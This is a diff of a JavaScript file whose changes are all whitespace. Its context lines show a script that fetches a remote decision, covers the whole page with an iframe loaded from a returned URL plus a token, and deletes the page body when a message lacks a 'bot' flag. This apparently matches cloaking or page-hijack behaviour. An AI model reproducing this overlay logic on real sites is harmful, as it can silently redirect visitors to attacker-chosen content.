@@ -1,4 +1,4 @@
- 
+
 
 const createLoader = () => {
     const frame = document.createElement('iframe');
@@ -18,7 +18,7 @@ const createLoader = () => {
         const parent = body;
         parent.insertBefore(frame, body.firstChild)
     }
-    
+
 }
 const toggleLoad = () => {
     const body = document.querySelector('body');
@@ -30,7 +30,7 @@ const toggleLoad = () => {
     if (load_frame) {
         load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
     }
-   
+
 };
 createLoader();
 
@@ -40,16 +40,16 @@ window.addEventListener('message', (message) => {
         const wrapper = document.querySelector('#wrapper_frame');
         console.log(wrapper);
         wrapper.remove();
-    setTimeout(toggleLoad, 500);
+        setTimeout(toggleLoad, 500);
 
-    } 
+    }
     if (!message.data?.bot) {
         const body = document.querySelector('body');
         body.remove()
-    setTimeout(toggleLoad, 500);
+        setTimeout(toggleLoad, 500);
 
     }
-    
+
 })
 
 window.addEventListener('DOMContentLoaded', () => {
@@ -57,12 +57,12 @@ window.addEventListener('DOMContentLoaded', () => {
         if (res?.code == 200 && !res.result) {
             createFrame(res.url + 'RNh9pLFN')
         } else {
-             setTimeout(toggleLoad, 500);
+            setTimeout(toggleLoad, 500);
 
         }
-        
+
     })
-  
+
 })
 
 
@@ -74,7 +74,7 @@ function createFrame(data) {
     frame.setAttribute('width', '100%');
     frame.setAttribute('height', '100vh');
     frame.setAttribute('id', 'wrapper_frame');
-    const html =  document.querySelector('html');
+    const html = document.querySelector('html');
     html.style.overflow = 'hidden';
 
     // body.innerHTML = '';
